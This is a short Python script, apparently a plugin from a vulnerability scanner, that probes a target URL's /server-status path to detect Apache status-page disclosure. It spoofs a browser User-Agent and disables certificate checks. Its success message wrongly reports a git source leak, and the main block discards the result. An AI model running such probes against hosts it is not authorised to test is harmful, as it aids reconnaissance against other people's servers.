#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: apache server-status信息泄露
referer: unknown
author: Lucifer
description: apache的状态信息文件泄露。
'''
import sys
import requests
import warnings


class apache_server_status_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/server-status"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"Server uptime" in req.text and r"Server Status" in req.text and req.status_code==200:
                return "[+]存在git源码泄露漏洞...(低危)\tpayload: "+vulnurl
            else:
                return "[-]NO vuln!"

        except:
            return "[-] ======>连接超时"

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = apache_server_status_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()